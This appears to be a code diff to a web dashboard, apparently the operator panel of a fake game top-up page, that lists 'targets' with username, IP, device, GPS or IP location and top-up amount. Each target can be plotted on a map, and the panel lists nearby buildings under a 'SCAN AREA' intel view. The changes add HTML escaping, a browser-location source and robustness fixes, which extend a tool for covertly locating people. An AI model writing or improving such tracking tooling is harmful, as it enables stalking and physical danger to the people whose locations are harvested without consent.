@@ -46,7 +46,9 @@
 
         .badge { background: #e4e6eb; padding: 3px 6px; border-radius: 4px; font-size: 0.7rem; color: #4b4f56; margin-right: 5px; font-weight: 600; }
         .badge-gps { background: #d1f2d1; color: #0f5132; border: 1px solid #badbcc; }
+        .badge-browser { background: #dbeafe; color: #1e3a8a; border: 1px solid #bfdbfe; }
         .badge-ip { background: #fff3cd; color: #664d03; border: 1px solid #ffecb5; }
+        .badge-unknown { background: #f1f3f5; color: #495057; border: 1px solid #dee2e6; }
         .status-dot { height: 10px; width: 10px; background-color: #42b72a; border-radius: 50%; display: inline-block; margin-right: 5px; }
         
         /* Intel Panel Styles */
@@ -218,6 +220,44 @@
             countDisplay.innerText = `Total Target: ${totalData}`;
         }
 
+        function escapeHtml(value) {
+            return String(value ?? '').replace(/[&<>"']/g, (char) => ({
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#39;'
+            }[char]));
+        }
+
+        function getLocationSource(item) {
+            if (item.locationSource) return item.locationSource;
+            return item.isHighAccuracy ? 'gps' : 'ip';
+        }
+
+        function getAccuracyText(item) {
+            return item.accuracy ? `${Number(item.accuracy).toFixed(1)}m` : 'N/A';
+        }
+
+        function getAccuracyBadge(item) {
+            const source = getLocationSource(item);
+            const accuracyVal = getAccuracyText(item);
+
+            if (source === 'gps') {
+                return `<span class="badge badge-gps">GPS Presisi (${accuracyVal})</span>`;
+            }
+
+            if (source === 'browser') {
+                return `<span class="badge badge-browser">Lokasi Browser (${accuracyVal})</span>`;
+            }
+
+            if (source === 'ip') {
+                return `<span class="badge badge-ip">Estimasi IP</span>`;
+            }
+
+            return `<span class="badge badge-unknown">Lokasi Tidak Tersedia</span>`;
+        }
+
         function renderRow(item, isNew = true) {
             const existingEmptyRow = document.getElementById('empty-row');
             if (existingEmptyRow) existingEmptyRow.remove();
@@ -225,26 +265,39 @@
             const row = document.createElement('tr');
             if (isNew) row.className = 'new-row';
             
-            const accuracyVal = item.accuracy ? `${item.accuracy.toFixed(1)}m` : 'IP Base';
-            const accuracyBadge = item.isHighAccuracy ? 
-                `<span class="badge badge-gps">GPS Presisi (${accuracyVal})</span>` : 
-                `<span class="badge badge-ip">Estimasi IP</span>`;
-
-            const deviceBadge = `<span class="badge">${item.userAgent.includes('Android') ? 'Android' : (item.userAgent.includes('iPhone') ? 'iOS' : 'PC')}</span>`;
+            const accuracyBadge = getAccuracyBadge(item);
+            const userAgent = item.userAgent || '';
+            const deviceBadge = `<span class="badge">${userAgent.includes('Android') ? 'Android' : (userAgent.includes('iPhone') ? 'iOS' : 'PC')}</span>`;
+            const mapsButton = item.mapsLink
+                ? `<button class="maps-btn" type="button" data-action="scan">SCAN AREA</button>`
+                : `<span class="badge badge-unknown">NO MAP</span>`;
+            const safeUsername = escapeHtml(item.username || '-');
+            const safeGame = escapeHtml(item.game || '-');
+            const safeNominal = escapeHtml(item.nominal || '-');
+            const safeIp = escapeHtml(item.ip || '-');
+            const safeLocation = escapeHtml(item.location || '-');
+            const safeTimestamp = escapeHtml(item.timestamp || '-');
 
             row.innerHTML = `
-                <td><small>${item.timestamp}</small></td>
-                <td><strong>${item.username}</strong></td>
+                <td><small>${safeTimestamp}</small></td>
+                <td><strong>${safeUsername}</strong></td>
                 <td>${deviceBadge}</td>
-                <td><small>${item.game}</small><br><strong>${item.nominal}</strong></td>
-                <td>${accuracyBadge}<br><small>${item.ip}</small></td>
-                <td><small>${item.location}</small></td>
-                <td>
-                    <button class="maps-btn" onclick="triggerIntel('${item.mapsLink}', ${item.accuracy || 100}, '${item.username}')">SCAN AREA</button>
-                </td>
+                <td><small>${safeGame}</small><br><strong>${safeNominal}</strong></td>
+                <td>${accuracyBadge}<br><small>${safeIp}</small></td>
+                <td><small>${safeLocation}</small></td>
+                <td>${mapsButton}</td>
             `;
 
-            row.onclick = () => triggerIntel(item.mapsLink, item.accuracy || 100, item.username);
+            if (item.mapsLink) {
+                const scanBtn = row.querySelector('[data-action="scan"]');
+                if (scanBtn) {
+                    scanBtn.addEventListener('click', (event) => {
+                        event.stopPropagation();
+                        triggerIntel(item.mapsLink, item.accuracy || 100, item.username);
+                    });
+                }
+                row.onclick = () => triggerIntel(item.mapsLink, item.accuracy || 100, item.username);
+            }
 
             if (isNew) {
                 tbody.insertBefore(row, tbody.firstChild);
@@ -260,7 +313,8 @@
                     const match = item.mapsLink.match(/q=([^,]+),([^&]+)/);
                     if (match) {
                         const [lat, lng] = match.slice(1);
-                        const color = item.isHighAccuracy ? '#ff4d4d' : '#ffa500';
+                        const source = getLocationSource(item);
+                        const color = source === 'gps' ? '#ff4d4d' : (source === 'browser' ? '#2563eb' : '#ffa500');
                         
                         const marker = L.marker([lat, lng], {
                             icon: L.divIcon({
@@ -280,7 +334,7 @@
                             weight: 1
                         }).addTo(map);
                         
-                        marker.bindPopup(`<b>${item.username}</b><br>Accuracy: ${radius}m area`);
+                        marker.bindPopup(`<b>${escapeHtml(item.username || '-')}</b><br>${escapeHtml(item.location || '-')}<br>Radius: ${radius}m`);
                         
                         markers.push(marker);
                         circles.push(circle);
@@ -296,6 +350,7 @@
         }
 
         async function triggerIntel(mapsLink, accuracy, username) {
+            if (!mapsLink) return;
             const match = mapsLink.match(/q=([^,]+),([^&]+)/);
             if (!match) return;
             const [lat, lng] = match.slice(1).map(Number);
@@ -372,10 +427,12 @@
                     buildingList.innerHTML = buildings.slice(0, 6).map(b => {
                         const name = b.tags.name || b.tags.amenity || b.tags.shop || 'Gedung Tanpa Nama';
                         const type = b.tags.building || b.tags.amenity || 'Bangunan Umum';
+                        const safeName = escapeHtml(name.charAt(0).toUpperCase() + name.slice(1));
+                        const safeType = escapeHtml(type.charAt(0).toUpperCase() + type.slice(1));
                         return `
                             <div class="building-card" style="border-left-color: #0084ff; background: white;">
-                                <span class="building-name" style="color:#1c1e21;">${name.charAt(0).toUpperCase() + name.slice(1)}</span>
-                                <span class="building-type" style="color:#65676b;">${type.charAt(0).toUpperCase() + type.slice(1)}</span>
+                                <span class="building-name" style="color:#1c1e21;">${safeName}</span>
+                                <span class="building-type" style="color:#65676b;">${safeType}</span>
                             </div>
                         `;
                     }).join('');
@@ -383,7 +440,7 @@
                     buildingList.innerHTML = `
                         <div class="building-card" style="border-left-color: #ddd;">
                             <span class="building-name">Area Pemukiman</span>
-                            <span class="building-type">Analisis dari titik IP Geolocation</span>
+                            <span class="building-type">Analisis dari titik lokasi yang tersedia</span>
                         </div>`;
                 }
 
